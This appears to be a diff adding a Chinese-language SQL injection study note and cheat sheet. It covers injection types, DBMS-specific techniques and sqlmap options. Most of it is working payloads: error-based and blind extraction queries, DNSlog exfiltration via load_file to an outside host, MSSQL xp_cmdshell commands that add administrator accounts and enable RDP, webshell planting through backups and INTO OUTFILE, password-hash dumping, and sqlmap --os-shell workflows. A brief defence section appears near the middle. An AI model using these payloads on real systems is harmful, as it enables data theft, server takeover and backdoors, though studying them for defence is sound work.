@@ -1,0 +1,714 @@
+SQL注入——
+SQL注入漏洞主要形成的原因是在数据交互中,前端的数据传入到后台处理时,没有做严格的判断
+导致其传入的“数据”拼接到SQL语句中后,被当作SQL语句的一部分执行,从而导致数据库受损
+id=1 or 1=1
+# SQL注入检测
+id=1 sadasda
+# 报错检测
+id=1 union select 1,2,3,4
+# union组合查询select段,可用group_concat和concat等语句合并查询匹配
+
+SQL注入数据类型分类——
+数字型为where id=1
+不需要考虑引号闭合
+字符型为where id='1'
+需要考虑引号闭合,是单引号还是双引号,注释掉闭合后的内容
+搜索型为where like '%an%'
+搜索型需要考虑绕过通配符和引号,手动添加通配符和引号闭合,然后注释掉注入之后的通配符和引号
+xx型为where id=('1')
+xx型为格式不标准的搜索语句,需要考虑如何对不同的标准进行闭合,可以考虑先触发报错观察闭合情况
+
+SQL注入HTTP请求方法分类——
+任何涉及到向后端传参的地方都有可能存在sql注入
+post请求放在请求主体中,不会涉及url编码。因此最好使用抓包工具修改
+get请求放在url中,涉及url编码。直接在前端修改
+请求头中可利用的注入点主要是referer、user-agent、cookie
+
+SQL注入攻击类型分类——
+使用union连接其他查询语句获取更多的信息,一般同order by语句搭配使用
+-
+information_schema系统数据库存储在内存空间中,不以物理文件形式存在,
+存储的是对当前数据库的统计,如使用的字符集、有哪些数据库等等。
+因此对这个数据库查询相关表,如schemata和tables可知道有哪些数据库和表。
+同时查询mysql.user也有可能查询到账号密码等
+-
+基于函数的报错注入主要有updatexml、extractvalue、floor三个函数
+updatexml
+#接收3个参数,第一个xml文档,第二个xpath语句,第三个字符串
+#原理和extravtvalue一样,构造错误的xpath语句报错
+extractvalue
+#extractvalue():接收2个参数,第一个xml文档,第二个xpath语句
+#用concat构造一个错误的xpath字符串,使extractvalue函数报错,显示出构造的'错误'字符串
+floor函数是用来取整的函数
+通过这些函数的报错信息来显示想要的内容
+k%' or updatexml(1,concat(0x7e,(select @@version),0x7e),1) #
+k%' or extractvalue(1,concat(0x7e,(select @@version),0x7e)) #
+select count(*) from information_schema.tables group by concat((select version())),floor(rang(0)*2);
+# 利用报错输出数据库版本
+常用函数
+#concat 连接字符串功能
+#floor  取float的整数值
+#rang   取0-1之间随机浮点值
+#group by   对结果集进行排序
+-
+updatexml报错实战
+select、delete语句注入
+#1 爆数据库版本信息
+k' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #
+#2 爆数据库当前用户
+k' and  updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) #
+#3 爆数据库
+k' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #
+#4 爆表名
+## 反馈回的错误表示只能显示一行,所以采用limit来一行一行显示
+k'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0) #
+#5 爆字段
+k' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 2,1)),0) #
+#6 爆字段内容
+k' and  updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) #
+insert、update、注入
+增、改同样可以用来进行报错注入,只是需要前后分别用or语句连接,使语句完整,一般需要抓包用bp改参数
+# 原语句
+insert into xxx id values ('k');
+# 报错注入语句
+k' or updatexml(1,concat(0x7e,(命令)),0) or'
+# 组合后语句
+insert into xxx id values ('k' or updatexml(1,concat(0x7e,(命令)),0) or'');
+head和cookie注入
+如果代码调用了head或cookie中的信息拿到数据库进行拼接,也可以用报错注入尝试
+同样是先用单引号找到注入点,在进行注入
+# http head头注入,假如是对浏览器类型的检测
+Mozilla ' or updatexml(1,concat(0x7e,database ()),0) or '
+# cookie注入,假如原cookie为 ant[uname]=admin
+ant[uname]=admin' and updatexml (1,concat(0x7e,database()),0) #
+
+布尔型盲注——
+返回页面只有对与错两种页面,无法通过报错和回显判断sql语句执行情况,这种时候就需要使用布尔盲注
+使用and来进行布尔判断。如sadasd' and 1=1 #判断是否存在盲注
+使用substr(str,start,last)加上ascii转换来获取信息,如:
+asc' and ascii(substr(database(),1,1))=112 #来判断数据库的首字母是多少
+asc' and length(database())=1 #来判断数据库的字符名长度是多少
+使用burp_suite的测试器来进行盲注
+
+时间型盲注——
+和布尔型盲注不同,返回页面只有一种,无法判断是否注入成功,因此可以使用sleep判断是否存在注入
+vince' and if(substr(database(),1,1)='p',sleep(10),null)#
+也可以使用benchmark语句来测试,benchmark('sql',10000)执行sql语句10000次
+或者人造笛卡尔积来进行注入
+
+dnslog盲注——
+dnslog盲注原理
+首先需要存在sql注入漏洞,但不回显,常规只能用布尔盲注和时间盲注猜单词
+但是利用Mysql load_file()函数(唯windowns),可以用sql语句发起web请求
+将我们盲注需要获取的信息,通过二级域名的方式,发起web请求
+利用特定的dns解析网站,获取这些二级域名的记录,就能得到数据
+前提要求
+windows系统
+该用户具有file权限
+SHOW VARIABLES LIKE 'secure_file_priv'结果为NULL
+dnslog盲注方法
+登录http://ceye.io/网站并注册,得到属于自己的identifier 先尝试在终端运行curl test.xxxx.ceye.io ,在解析记录就可以看到对应记录 在windows系统下,使用load_file()发起如下类似请求:
+select load_file(concat('\\\\',(select version()),'.xxxx.ceye.io\\abc'))
+如果解析记录有结果,后续就可以用sql注入的其他语法自由发挥了 有些特殊符号不能作为二级域名,通用的方法是用hex()转换为16进制处理
+
+宽字节注入——
+dbk处理编码的过程存在问题,可以构造数据消灭转义符\
+宽字节注入原理
+在对单双引号进行了转义过滤的情况下,前面的注入方式都不好使,但可以在引号前加上%df再进行sql注入尝试
+它的原理是\'编码后的值为%5C%27,使用GBK编码数据库时,两个字符为一个汉字,ASCII码只有128个,大于128的,就会和第二个字符组成一个汉字,使用%df\',编码后为%df%5C%27
+第一个码大于128,因此会使用前两个字符運,最后单剩一个引号,即编码后的值为運'
+然后就可以正常进行sql注入了
+宽字节注入方法
+黑盒测试:在可能的注入点后,键入%df'后,进行测试
+白合测试:
+查看mysql编码是否为GBK
+是否使用preg_replace转换单引号为\'
+是否使用addslashes进行转义
+是否使用mysql_real_escape_string进行转义
+宽字节注入防范
+使用utf-8,可以避免宽字节注入
+不仅在gbk中,韩文、日文等都是宽字节
+使用mysql_real_escape_string方法转义
+需同时设置mysql_set_charset('gbk',$conn)
+可以设置mysql连接参数:character_set_clinet=binary
+
+二次编码注入——
+php代码中用了urldecode()等编码函数,对url中的特殊字符进行编码,可以利用此函数与php自身编码转换,产生漏洞
+二次编码注入原理
+用户输入id=1%27,会被php转码为id=1'
+转义代码发现有单引号,转义为id=1\',无法sql注入
+用户输入id=1%2527,由于%25转码后就是%,因而会转码为id=1%27
+转义代码没有发现单引号,故不转义
+但后续urldecode等函数,处理url时,会将id=1%27转码为id=1',就可以注入
+注意:如果做白盒测试,要看urldecode函数 是否在转义方法之后
+
+二次注入——
+二次注入原理
+有些程序在进行数据库插入的时候,仅仅对特殊字符进行了转义,但仍然将数据写入了数据库,如果插入的数据包含恶意内容的话
+在插入到数据库中后,在另外的地方查询该数据的时候,如果没有对取出的数据做校验处理(即认为可信),直接使用该数据,就会造成sql二次注入
+二次注入举例
+举例1如下:
+新建用户admin'#,有特殊字符,但写入成功,并能使用该用户登录
+正常修改用户密码时
+sql语句如是:update user set password='1234' where username='x' and psssword='xx'
+但当用户为admin'#时
+sql语句变为:update user set password='1234' where username='admin'#' and xxxxx
+明显井号后的语句都被注释掉了
+结果就是会修改掉原有用户admin的密码
+举例2如下:
+有两个页面,一个页面写入数据,另一个页面可以有办法查看该数据
+如果写入时,写入了xx' union select 1,database(),3
+如果存在sql注入漏洞,写入的数据应该为1,库名,3
+在另一个页面就可以看到该库名数据
+二次注入防御
+对外部提交的数,需要更加谨慎处理,特殊字符不写入
+程序内部的数据调用,也要进行严格检查,不要认为可信
+
+防止SQL注入解决方案——
+解决SQL注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。通常修复使用的方案有：
+代码层面：
+对输入进行严格的转义和过滤
+使用参数化（Parameterized）：目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!
+PDO预处理 (Java、PHP防范推荐方法：)
+没有进行PDO预处理的SQL,在输入SQL语句进行执行的时候,web服务器自己拼凑SQL的时候有可能会把危险的SQL语句拼凑进去。但如果进行了PDO预处理的SQL,会让MYSQL自己进行拼凑,就算夹带了危险的SQL语句,也不会进行处理只会当成参数传进去,而不是以拼接进SQL语句传进去,从而防止了SQL注入。
+PDO数据库抽象层学习：http://www.php.cn/course/868.html
+网络层面：
+通过WAF设备启用防SQL Inject注入策略（或类似防护系统）
+云端防护（360网站卫士,阿里云盾等）
+
+access数据库注入——
+MySQL数据库中有information_schema数据库可以查到所有的表和所有的库,但其他数据库不一样
+access没有库的概念,因此可以直接通过枚举爆破猜测表名和段名
+猜测数据库表名 id=13 and exists(select * from user)
+猜测数据库段名 id=13 and exists(select username from administrator)
+猜测字段数据长度 id=13 and (select top 1 len(user_name) from administrator)>1
+猜测字段数据的内容 id=13 and (select top 1 asc(mid(user_name,1,1)) from administrator)>0
+使用工具萝卜头Havij、穿山甲pangolin
+
+MSSQL数据库注入——
+根据sa、dbowner、public权限分为三种注入情况
+通过and exists(select * from sysobjects)判断注入点,sysobjects是mssql自带的系统数据库
+通过and system_user=0报错判断当前数据库系统的用户名,但需要中间件正确配置
+判断注入点权限
+and 1=(select is_srvrolemember('sysadmin'))
+and 1=(select is_srvrolemember('db_owner'))
+and 1=(select is_srvrolemember('public'))
+如果查询返回正常页面,则说明当前数据库用户具有sa、db_owner、public权限,
+sa为数据库用户中最高权限,默认也是系统权限,如果数据库与Web服务器是同一个,可以通过MsSQL自带的存储过程对整个服务器进行控制。
+db_owner可以找到WEB的路径,然后用备份的方式得到webshell,有时也可以对注册表进行操作。
+public可以这里是暴表。
+如果权限不足,可通过注入点猜解数据库内容获得管理员账号。
+-
+MsSQL返回信息判断
+and @@version>0
+# 从页面返回的错误信息中,可以得到数据库版本信息。
+# 如果页面出错,但未返回可利用的信息,则说明MsSQL关闭了错误信息提示
+## 判断MsSQL支持多行语句查询
+;declare @d int 
+# 是否支持子查询
+and (select count (1) from [sysobjects])>=0
+# 获取当前数据库用户名
+and user>O
+# 获取当前数据库名称
+and db_name>0
+# 当前数据库名
+and l=convert (int,db_name ()) 或 1=(select db_name ())
+# 本地服务名
+and 1=(select @@servername)
+# 判断是否有库读取权限
+and 1=(Select HAS_DBACCESS ('master'))
+sa权限情况:
+通过and 1=(select count(*) from master.dbo.sysobjects where name = 'xp_cmdshell')判断是否开启了扩展存储过程
+如果扩展存储过程没有打开,并且我们是sa权限,则可以打开这个功能
+通过EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--打开cmdshell
+接下来就可以通过cmdshell执行任意命令
+;EXEC master..xp_cmdshell 'net user dms 123 /add'添加用户
+;EXEC master..xp_cmdshell 'net localgroup administrator test /add'将用户添加到管理员组
+;EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;开启3389远程连接端口
+攻击中最常利用的扩展存储
+xp_cmdshell—利用此存储过程可以直接执行系统命令。
+xp_regread—利用此存储过程可以进行注册表读取。
+xp_regwrit一利用此存储过程可以写入注册表。
+xp_dirtre一利用此存储过程可以进行列目录操作。
+xp_enumds—利用此存储过程可以进行ODBC连接。
+xp_loginconfig-利用此存储过程可以配置服务器安全模式信息。
+xp_makecab一一利用此存储过程可以创建压缩卷。
+xp_ntsec_enumdomains-利用此存储过程可以查看domain信息。
+xp_terminate_jroces一利用此存储过程可以查看终端进程,给出一个进程PID.
+dbowner权限情况:
+属主权限
+dbowner权限判断
+and 1=(SELECT IS_MEMBER('db_owner'));--
+当数据库连接账户为dbowner权限时,无法直接利用扩展存储执行各种系统命令,进行攻击的过程比较烦琐
+通常首先利用xp_dirtree扩展存储列出Web目录
+然后利用SQL语句创建一个临时表,插入一句话木马到临时表中。
+然后利用数据库备份语句,将数据库备份到Web目录并保存为ASP格式的文件,即可得到一个一句话木马后门。
+最后利用一句话木马客户端连接后门,得到WebShell控制整个服务器了
+db_owner目前公开的方法主要有五种：
+第一种：最普遍的backup,现在利用差异备份生成的asp文件确实要比以前小不少,但能否得到webshell,目前成功率还不是很高。
+第二种：在下的万能提权,此法成功率几乎为零,只有在特定的条件下面才能实现。
+第三种：《MSSQLdb_owner角色注入直接获得系统权限》所说的利用xp_regread读出VNC在注册表的加密密码,破解直接拿到系统权限,这种方法局限性比较大。
+第四种：利用xp_regwrite再注册表里直接加个系统帐号或者直接写个webshell,在主机重起的时候就可以拿到webshell或者系统权限。此法适用范围比较大,成功率也相对前3种较高点,但需要对方重起。
+第五种：利用添加作业的一些存储过程,sp_add_job,sp_addtask,xp_dirtree之类得到系统权限。理论上应该说是目前这5种里面成功率最高的的一种
+1.找出网站安装路径：
+当Web服务器与数据库在同一服务器主机上时,就可以备份一句话木马到Web目录了。但是在备份一句话木马前,首先需要搜索Web目录,可通过如下几个步骤实现。
+第壹种方法：通过报错或baidu、google等查找
+第贰种方法：这种方法需要满足三个条件,可以获取目标的所有盘符和深度
+SQL SERVER允许执行多行语句；
+该网站能进行注入；
+没有返回详细的错误提示信息(否则没有必要用这种方法)。
+# 1. 删除表black；首先建立一个临时表用于存放master..xp_dirtree(适合于public)生成的目录树,该表的dir字段表示目录的名称,depth字段表示目录的深度。
+;drop table black;create table temp(dir nvarchar (255), depth varchar(255),files varchar(255), id int not null identity (1,1))--
+# 2. 然后执行xp_dirtree获得D盘的目录树
+;insert into temp(dir,depth,files) exec master.dbo.xp_dirtree 'D:',1,1--
+# 3. 查看D盘有几个文件夹,这样对D盘有个大致的了解
+and (select count(*) from temp where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information','WINDOWS','CAConfig','wmpub','Microsoft UAM 卷'))>=数字(数字=0、1、2、3...)
+# 4. 接着在对方的网站上找几个一级子目录,如user、photo,然后,用筛选的方法来判断WEB根目录上是否存在此盘上
+## 看语句的返回结果,如果为真,表示WEB根目录有可能在此盘上
+and (select count(*) from temp where  dir<>'user')<(select count(*) from temp)
+and (select count(*) from temp where dir<>'photo')<(select count(*) from temp)
+# 5. 假设找到的WEB根目录在此盘上,用下面的语句来获得一级子目录的深度：
+## 假设得到的depth是3,说明user目录是D盘的3级目录,则WEB根目录是D盘的二级目录。
+and (select depth from temp where dir='user')>=数字  #数字=1、2、3...
+# 6. 接下来,另建一个临时表temp1,用来存放D盘的1级子目录下的所有目录
+;create table temp1(dir nvarchar(255),depth varchar(255));--
+# 7. 然后把从D盘的第一个子目录下的所有目录存到temp1中
+declare @dirname varchar(255);set @dirname='D:/'+(select top 1 dir from (select top 1 dir from temp where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information','WINDOWS','CAConfig','wmpub','Microsoft UAM 卷') order by dir desc)T order by dir);insert into temp1 exec master.dbo.xp_dirtree @dirname
+# 8. temp1中已经保存了所有D盘第一级子目录下的所有目录,用同样的方法来判断根目录是否在此一级子目录下
+## 如果返回为真,表示根目录可能在此子目录下,记住要多测试几个例子,如果都返回为假,则表明WEB根目录不在此目录下
+## 用同样的方法来获得D盘第2、3...个子目录下的所有目录列表,来判断WEB根目录是否在其下。
+## 要注意,用xp_dirtree前一定要把temp1表中的内容删除。
+and (select count(*) from temp1 where dir<>'user')<(select count(*) from temp1)
+# 9.假设WEB根目录在D盘的第一级子目录下,该子目录名称为website,
+## 前面我们知道了WEB根目录的深度为2,我们需要知道website下到底哪个才是真正的WEB根目录。
+## 用同样的方法,再建立第3个临时表 temp2
+;create table temp2(dir nvarchar(255),depth varchar(255));--
+# 10. 然后把从D盘的website下的所有目录存到temp2中
+declare @dirname varchar(255);set @dirname='D:/website/'+(select top 1 dir from (select top 1 dir from temp1 where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information','WINDOWS','CAConfig','wmpub','Microsoft UAM 卷') order by dir desc)T order by dir);insert into temp2 exec master.dbo.xp_dirtree @dirname
+# 11.用同样的方法判断该目录是否为根目录
+## 如果返回为真,为了确定我们的判断,多测试几个例子,方法上面都讲到了,如果多个例子都返回为真,那么就确定了该目录为WEB根目录。
+and (select count(*) from temp2 where dir<>'user')<(select count(*) from temp2)
+用以上的方法基本上可以获得WEB根目录,现在我们假设WEB根目录是：D:/website/www
+# 12. 查询临时表中的内容,也就是指定的目录文件和文件夹名。由于不能一次性获取所有目录文件和文件夹名,因此需要更改id的值,依次列出文件和文件夹来。
+and (select dir from temp where id=1)>0
+2.获取数据库用户名
+'http://192.168.1.55/sqlserver/1.aspx?xxser=1 and db_name() =O--
+3.写入一句话木马：
+方法一：一句话木马'（通过中国菜刀）
+%20;exec%20master..xp_cmdshell%20'Echo%20"<%eval%20request("chopper")%>"%20>>%20c:\wwwtest\iis-xxser.com--wwwroot\muma.asp'--
+# <%eval%20request("chopper")%>   是一句话木马,需要根据web的不同而变化
+# c:\wwwtest\iis-xxser.com--wwwroot\   是路径
+# muma.asp   是一句话木马的名字
+方法二：差异备份'（此方法数据库必须曾经备份过事务日志）
+;alter database testdb set RECOVERY FULL;create table test_tmp(str image);backup log testdb to disk='c:\test1' with init;insert into test_tmp(str) values (0x3C2565786375746528726571756573742822636D64222929253E);backup log testdb to disk='C:\wwwtest\iis-xxser.com--wwwroot\yjh.asp';alter database testdb set RECOVERY simple
+# (0x3C2565786375746528726571756573742822636D64222929253E)   是一句话木马的16进制编码
+# C:\wwwtest\iis-xxser.com--wwwroot\   是物理路径
+# yjh.asp   是一句话木马的名字
+也可以使用工具代替上述操作（GetWebShell）,然后用菜刀连接目标
+地址为：目标的根目录地址然后/muma.asp
+密码为：“chopper”
+然后就可以进入对方的服务器了。
+public权限情况:
+通过and db_name()=0--报错获取数据库名
+通过and 0<>(select top 1 name from testdb.dbo.sysobjects where xtype=0x7500 and name not in (select top 2 name from testdb.dbo.sysobjects where xtype=0x7500))--获取当前数据库所有表名
+通过having 1=1--获取表与列名
+通过group by admin.id having 1=1--获取下一列
+通过group by admin.id,admin.name having 1=1--再获取下一列
+
+MySQL数据库注入——
+只有root用户才能通过information_schema库里的所有库所有表,因此能看到系统库和user表
+特定用户登陆只能从该库里看到自己能看到的表和库
+拿到所有的数据:
+构造注入,如1' union select 1,2 #
+version() @@version # 获取数据库版本
+user() # 获取用户名
+database() # 获取当前数据库名称
+@@version_compile_os # 获取操作系统名称
+1' union select 1,group_concat(schema_name) from information_schema.schemata # 
+1' union select 1,group_concat(table_name) from information_schema.tables where table_schema = '' #
+1' union select 1,group_concat(column_name) from information_schema.columns where table_schema = '' and table_name = '' #
+1' union select 1,concat(column1," ",column2) from database.table limit 1,1 #
+1' union select 1,count(column) from database.table #
+拿到登陆密码:
+1' union select 1,concat(user,password) from mysql.users limit 1,1 #
+1' union select 1,concat(user,authentication_string) from mysql.users limit 1,1 #
+读取任意文件:
+1' union select 1,load_file("/etc/password") #
+windows需要开启secure_file_priv权限,在my.ini中的[mysqld]添加secure_file_priv = ""
+上传写入webshell:
+将一句话木马转换编码后上传
+1' union select "?php @eval($_POST['123']);?",2 into outfile "C:\\phpstudy\\PHPTutorial\\WWW\\123.php" #
+需要开启secure_file_priv、知道站点目录、mysql用户是否拥有权限
+-
+进行快照抓取,包括脚本出错页面,因此可利用搜索引擎查找网站的出错信息,从而获得网站的物理路径。可在 Google 或 百度 中搜索 “ mysql site:***.com”或“warning site:***.com,error site:***.com.cn”等。
+漏洞暴路径,例如通过网站后台查看网站Web路径（需要root账号密码）、CC 攻击暴路径等
+常见WINDOWS下配置文件:
+c:/windows/php.ini    php配置信息
+c:/windows/my.ini     MYSQL配置文件,记录管理员登陆过的MYSQL用户名和密码
+c:\mysql\data\mysql\user.MYD     存储了mysql.user表中的数据库连接密码
+c:\windows\system32\inetsrv\MetaBase.xml     查看IIS的虚拟主机配置
+d:\APACHE\Apache2\conf\httpd.conf
+c:\windows\repair\sam     存储了WINDOWS系统初次安装的密码
+常见LUNIX/UNIX下配置文件:
+/usr/local/app/apache2/conf/httpd.conf     apache2缺省配置文件
+/usr/local/apache2/conf/httpd.conf
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf     虚拟网站设置
+/usr/local/app/php5/lib/php.ini     PHP相关设置
+/etc/sysconfig/iptables     从中得到防火墙规则策略
+/etc/httpd/conf/httpd.conf     apache配置文件
+/etc/rsyncd.conf     同步程序配置文件
+/etc/my.cnf     mysql的配置文件
+/etc/redhat-release     系统版本
+/usr/local/resin-3.0.22/conf/resin.conf     针对3.0.22的RESIN配置文件查看
+
+sqlmap——
+模式和常用参数
+sqlmap支持五种不同的注入模式：
+基于布尔的盲注：可以根据返回页面判断条件真假的注入；
+基于时间的盲注：用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；
+基于报错的注入：页面会返回错误信息,或者把注入的语句的结果直接返回在页面中；
+联合查询的注入：可以使用union的情况下的注入；
+堆叠查询的注入：可以同时执行多条语句的执行时的注入。
+常用sqlmap参数：
+-D 数据库名    -T 数据库表名     -C 数据库列名     -U 数据库用户名
+-D 数据库名 --tables    #获取D数据库中所有的表名
+-D 数据库名 -T 表名 --columns    #获取D数据库中T表里所有的列名
+-T 表名 -C username,password --dump   #下载T表里username,password列的数据内容
+-u   #-u=--url=URL ,指定url地址,get请求可以在url加上相关参数
+-r   #指定加载文件 ,适用于所有的请求和https。 流程是抓包、保存到文件、从文件加载HTTP请求；方便跳过设置一些其他参数（cookie,POST等）
+-p   #指定用url或文件中的哪个参数做注入参数
+-m   #读取文件中的url列表以批量测试
+--date    #post方式传入参数 --date "id=1&co=5"
+--dbs     #显示所有的数据库
+--current-user #获取当前数据库用户
+--current-db   #获取网站当前数据库
+--is-dba  #判断当前的用户是否为管理员
+--users   #获取所有数据库用户
+--level   #测试的等级（1-5,默1）,数值>=2的时候也会检查cookie里面的参数,当>=3的时候将检查User-agent和Referer。
+--risk    #测试的风险（0-3,默1）,1会测试大部分的测试语句,2会增加基于事件的测试语句,3会增加OR语句的SQL注入测试。
+--threads #同时执行测试的线程数
+--mobile  #模拟测试手机环境站点
+--batch -smart  #全自动化判断测试,不需要人确定
+--os-shell   #获取系统交互的shell
+--tamper "  "    #sqlmap绕过waf,需要加载绕过方式脚本,可多个
+--passwords  #尝试解码出hash密码原文
+-v   #输出信息级别: 0-6 ,
+     “0”只显示python错误以及严重的信息；
+     1同时显示基本信息和警告信息（默认）；
+     “2”同时显示debug信息；
+     “3”同时显示注入的payload；
+     “4”同时显示HTTP请求；
+     “5”同时显示HTTP响应头；
+     “6”同时显示HTTP响应页面；
+     如果想看到sqlmap发送的测试payload最好的等级就是3。
+--file-read  #读取服务器上指定文件内容 --file-read "C:/example.exe"
+--file-write #上传本地文件 --file-write "c:/1.txt" --file-dest "C:/php/sql.php"
+--file-dest  #上传到服务器指定目录
+一般的SQLMap操作流程：
+# 1.通过手工检测的方式,找到合适的注入点
+payload：'         #返回错误
+payload：and 1=1   #返回正常
+payload：and 1=2   #返回错误
+##满足以上条件即存在注入
+# 2.检查注入点：
+sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch --level3
+# 3.爆所有数据库信息：
+sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch --dbs 
+# 4.爆当前数据库信息,爆当前用户权限。
+sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch --current-db --is-dba
+# 5.指定库名列出所有表：
+sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch -D news --tables 
+# 6.指定库名表名列出所有字段：
+sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch -D news -T admin --column 
+# 7.指定库名表名字段dump出指定字段：
+sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch -D news -T admin -C name,pswd --dump 
+# 8.加载脚本绕过防火墙
+sqlmap -u "http://xx.com/" --data "word=1&number=5" --tamper randomcase.py
+# 9.爆当前的用户名称
+sqlmap -u "http://xx.com/" --data "word=1&number=5" --current-user
+# 10.爆当前用户密码
+sqlmap -u "http://xx.com/" --data "word=1&number=5" --passwods
+# 11.连接系统交互shell
+sqlmap -u "http://xx.com/" --data "word=1&number=5" --os-shell
+常用语句
+# 基础检测语法
+sqlmap.py -u http://127.0.0.1/user_info.php?uid=1024
+# 批量检测
+sqlmap.py -m target.txt
+## 注意target.txt跟sqlmap在同一个目录下。
+# 获取表中的数据个数
+sqlmap.py -u "http://www.potian.com/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb
+# 站点爬取
+sqlmap.py -u "http://www.secbang.com" --batch --crawl=3
+# 使用hex避免字符编码导致数据丢失
+sqlmap.py -u "http://www.secbang.com/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors
+# 模拟测试手机环境站点
+python sqlmap.py -u "http://www.secbang.com/vuln.php?id=1" --mobile
+# 智能判断测试
+sqlmap.py -u "http://www.secbang.com/info.php?id=1" --batch --smart
+# 结合burpsuite进行注入
+sqlmap.py -r burpsuite 抓包.txt
+# sqlmap 自动填写表单注入
+sqlmap.py -u URL --forms
+# 执行shell命令
+sqlmap.py -u "url" --os-cmd="ls" #执行net user命令
+sqlmap.py -u "url" --os-shell    #系统交互的shell
+# 延时注入
+sqlmap --dbs -u "url" --delay 0.5 #延时0.5秒*/ 
+sqlmap --dbs -u "url" --safe-freq #请求2次*/
+其他
+实用技巧
+这些选项可用于调整具体的SQL注入测试
+--technique=TECH    SQL注入技术测试（默认BEUST）    
+--time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）   
+--union-cols=UCOLS  定列范围用于测试UNION查询注入   
+--union-char=UCHAR  暴力猜测列的字符数   
+--union-from=UFROM  SQL注入UNION查询使用的格式  
+--dns-domain=DNS..  DNS泄露攻击使用的域名   
+--second-order=S..  URL搜索产生的结果页面
+枚举信息
+这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外还可以运行自定义的SQL语句。
+-a, –all           获取所有信息   
+-b, –banner        获取数据库管理系统的标识  
+--current-user      获取数据库管理系统当前用户   
+--current-db        获取数据库管理系统当前数据库   
+--hostname         获取数据库服务器的主机名称  
+--is-dba            检测DBMS当前用户是否DBA  
+--users             枚举数据库管理系统用户  
+--passwords         枚举数据库管理系统用户密码哈希   
+--privileges        枚举数据库管理系统用户的权限   
+--roles            枚举数据库管理系统用户的角色   
+--dbs             枚举数据库管理系统数据库  
+--tables            枚举的DBMS数据库中的表   
+--columns          枚举DBMS数据库表列   
+--schema            枚举数据库架构  
+--count             检索表的项目数,有时候用户只想获取表中的数据个数而不是具体的内容,那么就可以使用这个参数：sqlmap.py -u url –count -D testdb  
+--dump            转储数据库表项  
+--dump-all          转储数据库所有表项  
+--search           搜索列（S）,表（S）和/或数据库名称（S）  
+--comments          获取DBMS注释  
+-D DB               要进行枚举的指定数据库名  
+-T TBL              DBMS数据库表枚举  
+-C COL             DBMS数据库表列枚举  
+-X EXCLUDECOL     DBMS数据库表不进行枚举  
+-U USER           用来进行枚举的数据库用户  
+--exclude-sysdbs    枚举表时排除系统数据库   
+--start=LIMITSTART  获取第一个查询输出数据位置  
+--stop=LIMITSTOP   获取最后查询的输出数据  
+--first=FIRSTCHAR   第一个查询输出字的字符获取  
+--last=LASTCHAR    最后查询的输出字字符获取  
+--sql-query=QUERY   要执行的SQL语句  
+--sql-shell         提示交互式SQL的shell  
+--sql-file=SQLFILE  要执行的SQL文件  
+操作系统访问
+这些选项可以用于访问后端数据库管理系统的底层操作系统
+--os-cmd=OSCMD   执行操作系统命令（OSCMD）   
+--os-shell       交互式的操作系统的shell   
+--os-pwn          获取一个OOB shell,meterpreter或VNC   
+--os-smbrelay       一键获取一个OOBshell,meterpreter或VNC  
+--os-bof           存储过程缓冲区溢出利用  
+--priv-esc          数据库进程用户权限提升  
+--msf-path=MSFPATH  MetasploitFramework本地的安装路径  
+--tmp-path=TMPPATH  远程临时文件目录的绝对路径  
+Windows注册表访问
+这些选项可以被用来访问后端数据库管理系统Windows注册表
+--reg-read          读一个Windows注册表项值  
+--reg-add           写一个Windows注册表项值数据  
+--reg-del           删除Windows注册表键值  
+--reg-key=REGKEY    Windows注册表键  
+--reg-value=REGVAL  Windows注册表项值  
+--reg-data=REGDATA  Windows注册表键值数据  
+--reg-type=REGTYPE  Windows注册表项值类型  
+优化功能
+这些选项可用于优化sqlmap性能
+-o               打开所有的优化开关    
+--predict-output    预测普通查询输出    
+--keep-alive        使用持久HTTP（S）连接    
+--null-connection   获取页面长度    
+--threads=THREADS   当前http(s)最大请求数 (默认 1)  
+指定注入
+这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。
+-p TESTPARAMETER    可测试的参数    
+--skip=SKIP         跳过对给定参数的测试    
+--skip-static       跳过测试不显示为动态的参数    
+--param-exclude=..  使用正则表达式排除参数进行测试（e.g. “ses”）   
+--dbms=DBMS         强制后端的DBMS为此值    
+--dbms-cred=DBMS..  DBMS认证凭证(user:password)    
+--os=OS            强制后端的DBMS操作系统为这个值    
+--invalid-bignum    使用大数字使值无效    
+--invalid-logical   使用逻辑操作使值无效   
+--invalid-string    使用随机字符串使值无效    
+--no-cast          关闭有效载荷铸造机制    
+--no-escape         关闭字符串逃逸机制    
+--prefix=PREFIX     注入payload字符串前缀  
+--suffix=SUFFIX     注入payload字符串后缀    
+--tamper=TAMPER   使用给定的脚本篡改注入数据
+Tamper功能
+序号    脚本名称    注释  
+1    0x2char    将每个编码后的字符转换为等价表达  
+2    apostrophemask    单引号替换为Utf8字符  
+3    apostrophenullencode    替换双引号为%00%27  
+4    appendnullbyte    有效代码后添加%00  
+5    base64encode    使用base64编码  
+6    between    比较符替换为between  
+7    bluecoat    空格替换为随机空白字符,等号替换为like  
+8    chardoubleencode    双url编码  
